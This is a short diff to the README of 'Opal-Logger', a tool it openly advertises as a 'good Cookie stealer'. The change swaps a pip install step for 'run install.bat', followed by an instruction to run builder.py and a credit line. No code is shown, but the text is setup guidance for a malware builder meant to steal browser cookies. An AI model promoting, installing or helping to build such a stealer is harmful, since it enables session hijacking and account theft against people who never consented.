@@ -1,7 +1,7 @@
 # Opal-Logger
 good Cookie stealer
 
-pip install -r requirements.txt
+run install.bat
 
 run builder.py 
 credits to joselol for making builder
